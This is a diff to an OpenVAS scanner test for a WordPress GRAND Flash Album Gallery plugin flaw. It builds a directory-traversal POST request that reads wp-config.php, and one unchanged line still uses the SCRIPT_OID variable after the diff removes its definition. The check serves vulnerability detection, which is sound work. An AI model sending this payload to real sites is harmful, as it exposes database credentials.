@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_grand_fia_gallery_plugin_dir_trav_vuln.nasl 3570 2016-06-21 07:49:45Z benallard $
+# $Id: gb_wordpress_grand_fia_gallery_plugin_dir_trav_vuln.nasl 5840 2017-04-03 12:02:24Z cfi $
 #
 # WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities
 #
@@ -46,14 +46,13 @@ For updates refer to http://wordpress.org/extend/plugins/flash-album-gallery";
 tag_summary = "This host is installed with WordPress GRAND Flash Album Gallery
 Plugin and is prone to multiple vulnerabilities.";
 
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802015";
 CPE = "cpe:/a:wordpress:wordpress";
 
 if(description)
 {
-  script_oid(SCRIPT_OID);
-  script_version("$Revision: 3570 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:49:45 +0200 (Tue, 21 Jun 2016) $");
+  script_oid("1.3.6.1.4.1.25623.1.0.802015");
+  script_version("$Revision: 5840 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:02:24 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -64,7 +63,6 @@ if(description)
   script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/sql_injection_in_grand_flash_album_gallery_wordpress_plugin.html");
 
   script_tag(name:"qod_type", value:"remote_vul");
-  script_summary("Check for directory traversal vulnerability in WordPress GRAND FIA Gallery Plugin");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -79,40 +77,23 @@ if(description)
   exit(0);
 }
 
-##
-## The script code starts here
-##
-
 include("http_func.inc");
-include("version_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-
-## Get HTTP Port
-if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
-
-## Check Host Supports PHP
-if(!can_host_php(port:port)){
-  exit(0);
-}
-
-## Get Host Name or IP
-host = get_host_name();
-if(!host){
-  exit(0);
-}
-
-## Get WordPress Installed Location
+if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
+
+host = http_host_name( port:port );
 
 ## Post Data
 postData = "want2Read=..%2F..%2F..%2F..%2Fwp-config.php&submit=submit";
 path = dir + "/wp-content/plugins/flash-album-gallery/admin/news.php";
 
 ## Construct attack post request
-req = string("POST ", path, " HTTP/1.1\r\n", "Host: ", host, "\r\n",
-             "User-Agent: GRAND FIA Gallery Dir Trav Test\r\n",
+req = string("POST ", path, " HTTP/1.1\r\n",
+             "Host: ", host, "\r\n",
+             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(postData),
              "\r\n\r\n", postData);
